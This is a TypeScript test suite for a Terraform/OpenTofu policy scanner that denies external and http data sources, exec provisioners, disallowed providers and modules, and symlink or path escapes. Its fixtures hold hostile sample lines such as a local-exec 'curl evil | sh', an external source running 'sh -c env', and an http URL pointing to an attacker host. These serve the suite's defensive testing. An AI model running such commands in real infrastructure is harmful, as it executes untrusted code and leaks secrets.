/** The scan over real directories: a root of .tf / .tf.json files in a temp dir. */
import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { dirname, join } from "path";
import { parseInfraPolicyConfig } from "./config.js";
import { MAX_FILES, MAX_FILE_BYTES, MAX_MODULE_DEPTH, agentMessage, scanRoot, type ScanOptions, type ScanResult } from "./scan.js";

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function tree(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "infra-policy-"));
  dirs.push(root);
  for (const [name, text] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, text);
  }
  return join(root, "stack");
}

type Config = Record<string, unknown>;

/** Scan a tree; `config` may be a function of the root path (an allow entry names it) */
async function scan(files: Record<string, string>, config: Config | ((root: string) => Config) = {}, options: ScanOptions = {}): Promise<ScanResult> {
  const root = tree({ ...files });
  mkdirSync(root, { recursive: true });
  const extra = typeof config === "function" ? config(root) : config;
  const parsed = parseInfraPolicyConfig({ enabled: true, roots: [root], allowed_providers: ["hashicorp/aws"], ...extra });
  if (!parsed.ok) throw new Error(parsed.errors.join("; "));
  return scanRoot(root, parsed.settings, options);
}

const rules = (r: ScanResult) => r.violations.map((v) => v.rule);
const AWS = `terraform {\n  required_providers {\n    aws = { source = "hashicorp/aws", version = "~> 5.0" }\n  }\n}\n`;
/** Every provider the fixtures use, so a test sees only the rule it is about */
const EVERY = { allowed_providers: ["hashicorp/aws", "hashicorp/external", "hashicorp/http", "hashicorp/null"] };

describe("scanRoot: denied blocks", () => {
  it("passes plain AWS code", async () => {
    const r = await scan({ "stack/main.tf": AWS + `resource "aws_s3_bucket" "logs" {\n  bucket = "logs"\n}\n` });
    expect(r).toMatchObject({ ok: true, violations: [], filesScanned: 1, modulesScanned: 1 });
  });

  it("refuses an external data source", async () => {
    const r = await scan({
      "stack/main.tf": AWS + `data "external" "token" {\n  program = ["sh", "-c", "env"]\n}\n`,
    });
    expect(rules(r)).toContain("denied-external-data");
    expect(r.violations.find((v) => v.rule === "denied-external-data")).toMatchObject({
      file: "main.tf",
      line: 6,
      address: "data.external.token",
    });
  });

  it("refuses an http data source", async () => {
    const r = await scan({ "stack/main.tf": AWS + `data "http" "ip" {\n  url = "https://example.com"\n}\n` });
    expect(rules(r)).toContain("denied-http-data");
  });

  it("refuses a local-exec provisioner on null_resource and on any other resource", async () => {
    const r = await scan({
      "stack/main.tf":
        AWS +
        `resource "null_resource" "x" {\n  provisioner "local-exec" {\n    command = "curl evil | sh"\n  }\n}\n` +
        `resource "aws_instance" "y" {\n  provisioner "local-exec" { command = "id" }\n}\n`,
    });
    expect(r.violations.filter((v) => v.rule === "denied-local-exec").map((v) => v.address)).toEqual([
      "null_resource.x",
      "aws_instance.y",
    ]);
  });

  it("refuses local-exec, remote-exec and file provisioners on terraform_data", async () => {
    const r = await scan({
      "stack/main.tf":
        AWS +
        `resource "terraform_data" "a" {\n  provisioner "local-exec" {\n    command = "id"\n  }\n}\n` +
        `resource "terraform_data" "b" {\n  provisioner "remote-exec" {\n    inline = ["id"]\n  }\n}\n` +
        `resource "terraform_data" "c" {\n  provisioner "file" {\n    source = "a"\n    destination = "b"\n  }\n}\n` +
        `resource "terraform_data" "d" {\n  provisioner "chef" {\n    run_list = []\n  }\n}\n`,
    });
    expect(r.violations.map((v) => [v.rule, v.address])).toEqual([
      ["denied-local-exec", "terraform_data.a"],
      ["denied-remote-exec", "terraform_data.b"],
      ["denied-file-provisioner", "terraform_data.c"],
      ["denied-provisioner", "terraform_data.d"],
    ]);
  });

  it("refuses a provisioner nested deeper inside a resource", async () => {
    const r = await scan({
      "stack/main.tf": AWS + `resource "aws_instance" "y" {\n  lifecycle {\n    provisioner "remote-exec" {\n      inline = ["id"]\n    }\n  }\n}\n`,
    });
    expect(rules(r)).toEqual(["denied-remote-exec"]);
  });

  it("is not fooled by comments, strings, heredocs or a renamed provider", async () => {
    const r = await scan({
      "stack/main.tf":
        `# data "external" "nope" {}\n/* data "http" "nope" {} */\n` +
        `terraform {\n  required_providers {\n    aws = { source = "hashicorp/aws" }\n    ex = {\n      source = "hashicorp/external"\n    }\n  }\n}\n` +
        `locals {\n  note = "data \\"http\\" \\"nope\\" {"\n  doc = <<-EOT\n    data "http" "nope" {\n  EOT\n}\n` +
        `data "ex" "renamed" {\n  program = ["x"]\n}\n`,
    });
    // the comment, string and heredoc cause nothing; the renamed external does (and its provider is not allowed)
    expect(rules(r).sort()).toEqual(["denied-external-data", "provider-not-allowed"]);
  });

  it("is not fooled by a string or heredoc that looks like the end of a block", async () => {
    const r = await scan(
      {
        "stack/main.tf":
          `locals {\n  a = "} data \\"http\\" \\"fake\\" {"\n  b = <<EOT\n}\ndata "http" "heredoc" {\nEOT\n}\n` +
          `data "http" "real" {\n  url = "https://example.com"\n}\n`,
      },
      EVERY,
    );
    expect(r.violations.map((v) => v.address)).toEqual(["data.http.real"]);
  });

  it("reads .tf.json files the same way", async () => {
    const r = await scan({
      "stack/main.tf.json": JSON.stringify({
        terraform: { required_providers: { aws: { source: "hashicorp/aws" } } },
        data: { external: { token: { program: ["sh"] } } },
        resource: { null_resource: { x: { provisioner: [{ "local-exec": { command: "id" } }] } } },
      }),
    });
    // external and null are not allowed providers either
    expect(rules(r).sort()).toEqual(["denied-external-data", "denied-local-exec", "provider-not-allowed", "provider-not-allowed"]);
  });

  it("reads .tofu files", async () => {
    const r = await scan({ "stack/main.tofu": `data "http" "ip" {\n  url = "https://example.com"\n}\n` }, EVERY);
    expect(rules(r)).toEqual(["denied-http-data"]);
  });

  it("reads a provider alias and a provider meta-argument", async () => {
    const aliased = await scan({
      "stack/main.tf": AWS + `provider "aws" {\n  alias = "west"\n  region = "us-west-2"\n}\nresource "aws_s3_bucket" "b" {\n  provider = aws.west\n  bucket = "b"\n}\n`,
    });
    expect(aliased.ok).toBe(true);
    // the provider meta-argument names the provider that is used, not the type prefix
    const meta = await scan({
      "stack/main.tf": AWS + `resource "aws_s3_bucket" "b" {\n  provider = ext.alias\n  bucket = "b"\n}\n`,
    });
    expect(meta.violations).toMatchObject([{ rule: "provider-not-allowed", detail: expect.stringContaining("hashicorp/ext") }]);
  });

  it("reads a provider meta-argument that is a string in .tf.json", async () => {
    const r = await scan({
      "stack/main.tf.json": JSON.stringify({
        terraform: { required_providers: { aws: { source: "hashicorp/aws" } } },
        resource: { aws_s3_bucket: { b: { provider: "ext.alias", bucket: "b" } } },
      }),
    });
    expect(r.violations).toMatchObject([{ rule: "provider-not-allowed", detail: expect.stringContaining("hashicorp/ext") }]);
  });
});

describe("scanRoot: escapes in labels", () => {
  it.each([
    ["data external", `data "\\u0065xternal" "x" {\n  program = ["id"]\n}\n`, "denied-external-data"],
    ["data http", `data "ht\\u0074p" "y" {\n  url = "https://example.com"\n}\n`, "denied-http-data"],
    ["long escape", `data "\\U00000065xternal" "x" {\n  program = ["id"]\n}\n`, "denied-external-data"],
    ["local-exec", `resource "null_resource" "z" {\n  provisioner "local\\u002dexec" {\n    command = "id"\n  }\n}\n`, "denied-local-exec"],
    ["remote-exec", `resource "null_resource" "z" {\n  provisioner "remote\\u002Dexec" {\n    inline = ["id"]\n  }\n}\n`, "denied-remote-exec"],
  ])("decodes an escape in %s before matching", async (_name, code, rule) => {
    const r = await scan({ "stack/main.tf": code }, EVERY);
    expect(rules(r)).toContain(rule);
  });

  it("decodes escapes in .tf.json labels", async () => {
    const r = await scan({ "stack/main.tf.json": '{"data": {"\\u0065xternal": {"x": {"program": ["id"]}}}}' }, EVERY);
    expect(rules(r)).toEqual(["denied-external-data"]);
  });

  it("refuses an escape it does not decode, or a broken one", async () => {
    for (const label of ["ex\\qternal", "ex\\u12", "ex\\uD800", "ex\\U00110000", "ex\\uZZZZ"]) {
      const r = await scan({ "stack/main.tf": `data "${label}" "x" {\n}\n` }, EVERY);
      expect(rules(r), label).toEqual(["unreadable"]);
    }
  });

  it("refuses an interpolation in a label", async () => {
    const r = await scan({ "stack/main.tf": `data "\${var.kind}" "x" {\n}\n` }, EVERY);
    expect(rules(r)).toEqual(["unreadable"]);
  });
});

describe("scanRoot: check and removed blocks, unknown blocks", () => {
  const CHECK = `check "health" {\n  data "http" "h" {\n    url = "https://example.com"\n  }\n  assert {\n    condition = data.http.h.status_code == 200\n    error_message = "down"\n  }\n}\n`;
  const REMOVED = `removed {\n  from = aws_instance.old\n  lifecycle {\n    destroy = false\n  }\n  provisioner "local-exec" {\n    when = destroy\n    command = "id"\n  }\n}\n`;

  it("scans a data source inside a check block (HCL)", async () => {
    const r = await scan({ "stack/main.tf": CHECK.replace(`"http" "h"`, `"external" "h"`).replace("url =", "program =") }, EVERY);
    expect(r.violations).toMatchObject([{ rule: "denied-external-data", address: "check.health.data.external.h" }]);
    const http = await scan({ "stack/main.tf": CHECK }, EVERY);
    expect(http.violations).toMatchObject([{ rule: "denied-http-data", address: "check.health.data.http.h" }]);
  });

  it("scans a data source inside a check block (.tf.json)", async () => {
    const r = await scan(
      { "stack/main.tf.json": JSON.stringify({ check: { health: { data: { http: { h: { url: "https://example.com" } } } } } }) },
      EVERY,
    );
    expect(r.violations).toMatchObject([{ rule: "denied-http-data", address: "check.health.data.http.h" }]);
  });

  it("scans a removed block's destroy-time provisioner (HCL)", async () => {
    const r = await scan({ "stack/main.tf": REMOVED }, EVERY);
    expect(r.violations).toMatchObject([{ rule: "denied-local-exec", address: "removed.aws_instance.old", line: 6 }]);
  });

  it("scans a removed block's destroy-time provisioner (.tf.json)", async () => {
    const r = await scan(
      { "stack/main.tf.json": JSON.stringify({ removed: { from: "aws_instance.old", provisioner: [{ "local-exec": { when: "destroy", command: "id" } }] } }) },
      EVERY,
    );
    expect(r.violations).toMatchObject([{ rule: "denied-local-exec", address: "removed.aws_instance.old" }]);
  });

  it("refuses a block type it does not know, in HCL and in .tf.json", async () => {
    expect(rules(await scan({ "stack/main.tf": `mystery "x" {\n}\n` }))).toEqual(["unknown-block"]);
    expect(rules(await scan({ "stack/main.tf.json": '{"mystery": {"x": {}}}' }))).toEqual(["unknown-block"]);
  });

  it("refuses blocks with the wrong number of labels", async () => {
    const bad = [
      `resource "aws_s3_bucket" {\n}\n`,
      `data "http" "a" "b" {\n}\n`,
      `module "a" "b" {\n  source = "./x"\n}\n`,
      `module {\n  source = "./x"\n}\n`,
      `provider {\n}\n`,
      `check {\n}\n`,
      `removed "x" {\n}\n`,
    ];
    for (const code of bad) expect(rules(await scan({ "stack/main.tf": code }, EVERY)), code).toEqual(["unknown-block"]);
  });

  it("refuses .tf.json sections that are not objects", async () => {
    for (const doc of ['{"resource": "x"}', '{"data": {"http": "x"}}', '{"module": {"a": 1}}', '{"resource": [1]}']) {
      expect(rules(await scan({ "stack/main.tf.json": doc }, EVERY)), doc).toEqual(["unreadable"]);
    }
  });
});

describe("scanRoot: allow binds the block content", () => {
  const code = (url: string) => AWS + `data "http" "health" {\n  url = "${url}"\n}\ndata "http" "other" {\n  url = "https://example.org"\n}\n`;
  const config = { allowed_providers: ["hashicorp/aws", "hashicorp/http"] };

  it("lets the owner allow one block by root, address and hash, and still shows it", async () => {
    const first = await scan({ "stack/main.tf": code("https://example.com") }, config);
    const health = first.violations.find((v) => v.address === "data.http.health")!;
    expect(health.hash).toMatch(/^[0-9a-f]{64}$/);

    const r = await scan({ "stack/main.tf": code("https://example.com") }, (root) => ({
      ...config,
      allow: [{ root, address: "data.http.health", hash: health.hash }],
    }));
    expect(r.violations.map((v) => v.address)).toEqual(["data.http.other"]);
    expect(r.allowed.map((v) => v.address)).toEqual(["data.http.health"]);
  });

  it("stops allowing a block whose content changed, and says so", async () => {
    const first = await scan({ "stack/main.tf": code("https://example.com") }, config);
    const hash = first.violations.find((v) => v.address === "data.http.health")!.hash;
    const r = await scan({ "stack/main.tf": code("https://attacker.example") }, (root) => ({
      ...config,
      allow: [{ root, address: "data.http.health", hash }],
    }));
    expect(r.allowed).toEqual([]);
    expect(r.violations.find((v) => v.address === "data.http.health")).toMatchObject({
      rule: "denied-http-data",
      changedSinceAllowed: true,
      detail: expect.stringContaining("changed since it was allowed"),
    });
  });

  it("does not care about formatting or comments, only content", async () => {
    const first = await scan({ "stack/main.tf": code("https://example.com") }, config);
    const hash = first.violations.find((v) => v.address === "data.http.health")!.hash;
    const reformatted = AWS + `# note\ndata "http" "health" { url = "https://example.com" }\ndata "http" "other" {\n  url = "https://example.org"\n}\n`;
    const r = await scan({ "stack/main.tf": reformatted }, (root) => ({ ...config, allow: [{ root, address: "data.http.health", hash }] }));
    expect(r.allowed.map((v) => v.address)).toEqual(["data.http.health"]);
  });

  it("does not allow the same address in another root", async () => {
    const first = await scan({ "stack/main.tf": code("https://example.com") }, config);
    const hash = first.violations.find((v) => v.address === "data.http.health")!.hash;
    const r = await scan({ "stack/main.tf": code("https://example.com") }, (root) => ({
      ...config,
      roots: [root, "/srv/elsewhere"],
      allow: [{ root: "/srv/elsewhere", address: "data.http.health", hash }],
    }));
    expect(r.allowed).toEqual([]);
    expect(r.violations.map((v) => v.address)).toContain("data.http.health");
  });
});

describe("scanRoot: provider sources", () => {
  it("refuses a provider that is not in the allowlist, declared or implied", async () => {
    const declared = await scan({
      "stack/main.tf": `terraform {\n  required_providers {\n    evil = { source = "someone/evil" }\n  }\n}\n`,
    });
    expect(declared.violations).toMatchObject([{ rule: "provider-not-allowed", detail: expect.stringContaining("someone/evil") }]);
    const implied = await scan({ "stack/main.tf": `resource "google_storage_bucket" "b" {\n  name = "b"\n}\n` });
    expect(rules(implied)).toEqual(["provider-not-allowed"]);
  });

  it("treats short and full source names as one provider", async () => {
    const r = await scan(
      { "stack/main.tf": `terraform {\n  required_providers {\n    aws = { source = "registry.opentofu.org/hashicorp/aws" }\n  }\n}\n` },
      { allowed_providers: ["hashicorp/aws"] },
    );
    expect(r.ok).toBe(true);
  });

  it("refuses a source that is not a plain string", async () => {
    const r = await scan({
      "stack/main.tf": `terraform {\n  required_providers {\n    aws = { source = var.src }\n  }\n}\n`,
    });
    expect(rules(r)).toEqual(["source-not-literal"]);
  });
});

describe("scanRoot: modules", () => {
  it("refuses a remote module that is not allowed, and accepts one that is", async () => {
    const code = AWS + `module "vpc" {\n  source = "terraform-aws-modules/vpc/aws"\n  version = "5.0.0"\n}\n`;
    expect(rules(await scan({ "stack/main.tf": code }))).toEqual(["module-not-allowed"]);
    expect((await scan({ "stack/main.tf": code }, { allowed_modules: ["terraform-aws-modules/vpc/aws"] })).ok).toBe(true);
    const git = AWS + `module "m" {\n  source = "git::https://example.com/org/mod.git?ref=v1"\n}\n`;
    expect(rules(await scan({ "stack/main.tf": git }, { allowed_modules: ["git::https://example.com/other/"] }))).toEqual(["module-not-allowed"]);
    expect((await scan({ "stack/main.tf": git }, { allowed_modules: ["git::https://example.com/org/"] })).ok).toBe(true);
  });

  it("does not let a source climb out of an allowed prefix", async () => {
    const climb = AWS + `module "m" {\n  source = "git::https://example.com/org/../evil/mod.git"\n}\n`;
    expect(rules(await scan({ "stack/main.tf": climb }, { allowed_modules: ["git::https://example.com/org/"] }))).toEqual(["module-not-allowed"]);
  });

  it("scans local modules, with the module in the address", async () => {
    const r = await scan({
      "stack/main.tf": AWS + `module "net" {\n  source = "./modules/net"\n}\n`,
      "stack/modules/net/main.tf": `data "http" "ip" {\n  url = "https://example.com"\n}\n`,
    });
    expect(r.modulesScanned).toBe(2);
    expect(r.violations.find((v) => v.rule === "denied-http-data")).toMatchObject({
      file: "modules/net/main.tf",
      address: "module.net.data.http.ip",
    });
  });

  it("finds a denied block two modules deep", async () => {
    const r = await scan({
      "stack/main.tf": AWS + `module "a" {\n  source = "./a"\n}\n`,
      "stack/a/main.tf": `module "b" {\n  source = "./b"\n}\n`,
      "stack/a/b/main.tf": `resource "null_resource" "n" {\n  provisioner "remote-exec" {\n    inline = ["id"]\n  }\n}\n`,
    });
    expect(r.violations.find((v) => v.rule === "denied-remote-exec")).toMatchObject({
      file: "a/b/main.tf",
      address: "module.a.module.b.null_resource.n",
    });
    expect(r.modulesScanned).toBe(3);
  });

  it("scans a nested module written as .tf.json", async () => {
    const r = await scan({
      "stack/main.tf": AWS + `module "j" {\n  source = "./j"\n}\n`,
      "stack/j/main.tf.json": JSON.stringify({ data: { external: { x: { program: ["id"] } } } }),
    });
    expect(r.violations.find((v) => v.rule === "denied-external-data")).toMatchObject({ file: "j/main.tf.json", address: "module.j.data.external.x" });
  });

  it("refuses a local module outside the root, also through a symlink", async () => {
    const outside = await scan({
      "stack/main.tf": AWS + `module "up" {\n  source = "../elsewhere"\n}\n`,
      "elsewhere/main.tf": `data "external" "x" {\n  program = ["x"]\n}\n`,
    });
    expect(rules(outside)).toEqual(["module-outside-root"]);

    const root = tree({ "stack/main.tf": AWS + `module "l" {\n  source = "./link"\n}\n`, "elsewhere/main.tf": "" });
    symlinkSync(join(dirname(root), "elsewhere"), join(root, "link"));
    const parsed = parseInfraPolicyConfig({ enabled: true, roots: [root], allowed_providers: ["hashicorp/aws"] });
    if (!parsed.ok) throw new Error("config");
    expect(rules(await scanRoot(root, parsed.settings))).toEqual(["module-outside-root"]);
  });

  it("refuses a module that calls itself instead of looping", async () => {
    const r = await scan({ "stack/main.tf": AWS + `module "me" {\n  source = "./"\n}\n` });
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: "module calls itself" }]);
  });

  it("refuses modules nested deeper than the limit", async () => {
    const files: Record<string, string> = { "stack/main.tf": `module "m" {\n  source = "./m1"\n}\n` };
    let dir = "stack";
    for (let i = 1; i <= MAX_MODULE_DEPTH + 2; i++) {
      dir += `/m${i}`;
      files[`${dir}/main.tf`] = `module "m" {\n  source = "./m${i + 1}"\n}\n`;
    }
    const r = await scan(files);
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: expect.stringContaining("nested deeper") }]);
  });
});

describe("scanRoot: fail closed", () => {
  it("refuses code it cannot read", async () => {
    const r = await scan({ "stack/main.tf": `resource "aws_s3_bucket" "b" {\n  bucket = "x"\n` });
    expect(r.violations).toMatchObject([{ rule: "unreadable", file: "main.tf" }]);
    expect(rules(await scan({ "stack/main.tf.json": "{nope" }))).toEqual(["unreadable"]);
  });

  it("refuses a root that does not exist", async () => {
    const parsed = parseInfraPolicyConfig({ enabled: true, roots: ["/nonexistent/infra"] });
    if (!parsed.ok) throw new Error("config");
    expect(rules(await scanRoot("/nonexistent/infra", parsed.settings))).toEqual(["unreadable"]);
  });

  it("refuses a symlinked .tf file", async () => {
    const root = tree({ "outside.tf": `data "external" "x" {\n  program = ["id"]\n}\n`, "stack/main.tf": AWS });
    symlinkSync(join(dirname(root), "outside.tf"), join(root, "link.tf"));
    const parsed = parseInfraPolicyConfig({ enabled: true, roots: [root], allowed_providers: ["hashicorp/aws"] });
    if (!parsed.ok) throw new Error("config");
    const r = await scanRoot(root, parsed.settings);
    expect(r.violations).toMatchObject([{ rule: "unreadable", file: "link.tf" }]);
  });

  it("refuses a file over the size limit", async () => {
    const r = await scan({ "stack/main.tf": "#".repeat(MAX_FILE_BYTES + 1) });
    expect(r.violations).toMatchObject([{ rule: "unreadable", file: "main.tf" }]);
  });

  it("refuses more files than the limit", async () => {
    const files: Record<string, string> = {};
    for (let i = 0; i <= MAX_FILES; i++) files[`stack/f${String(i).padStart(4, "0")}.tf`] = "";
    const r = await scan(files);
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: expect.stringContaining("more than") }]);
    expect(r.filesScanned).toBe(MAX_FILES);
  });

  it("refuses code over the total size cap, though each file is small", async () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 4; i++) files[`stack/f${i}.tf`] = "#".repeat(1000) + "\n";
    const r = await scan(files, {}, { maxTotalBytes: 2500 });
    expect(r.ok).toBe(false);
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: "scan limit" }]);
    expect((await scan(files, {}, { maxTotalBytes: 10_000 })).ok).toBe(true);
  });

  it("refuses when the deadline passes, by the scan's clock", async () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 6; i++) files[`stack/f${i}.tf`] = "";
    let t = 0;
    const r = await scan(files, {}, { now: () => (t += 1000), deadlineMs: 3500 });
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: "scan limit" }]);
    expect(r.filesScanned).toBeLessThan(6);
  });
});

describe("agentMessage", () => {
  it("names the rules and nothing else", async () => {
    const r = await scan(
      { "stack/main.tf": AWS + `data "external" "secret_name_here" {\n  program = ["x"]\n}\n` },
      { allowed_providers: ["hashicorp/aws", "hashicorp/external"] },
    );
    const message = agentMessage(r);
    expect(message).toBe("policy violation: denied-external-data");
    expect(message).not.toContain("secret_name_here");
  });
});
